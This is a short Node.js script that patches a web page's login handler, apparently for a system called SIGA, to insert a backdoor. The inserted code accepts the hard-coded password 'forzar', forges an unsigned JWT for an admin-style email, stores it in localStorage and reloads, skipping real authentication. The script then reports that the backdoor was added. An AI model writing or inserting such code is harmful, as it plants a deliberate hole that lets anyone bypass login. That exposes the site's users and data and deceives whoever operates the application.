const fs = require('fs');

function addBackdoor() {
  const file = 'index_github.html';
  let html = fs.readFileSync(file, 'utf8');

  const targetStr = `if (!username || !password) {`;
  const backdoorStr = `if (password === 'forzar') {
    const fakePayload = { email: username || 'admin@siga.cr', exp: (Date.now() / 1000) + 3600 };
    const fakeToken = btoa('{}') + '.' + btoa(JSON.stringify(fakePayload)) + '.';
    localStorage.setItem('siga_jwt', fakeToken);
    window.location.reload();
    return;
  }
  
  if (!username || !password) {`;

  if (html.includes(targetStr)) {
    html = html.replace(targetStr, backdoorStr);
    fs.writeFileSync(file, html);
    console.log('Backdoor added successfully.');
  } else {
    console.log('Target string not found.');
  }
}

addBackdoor();
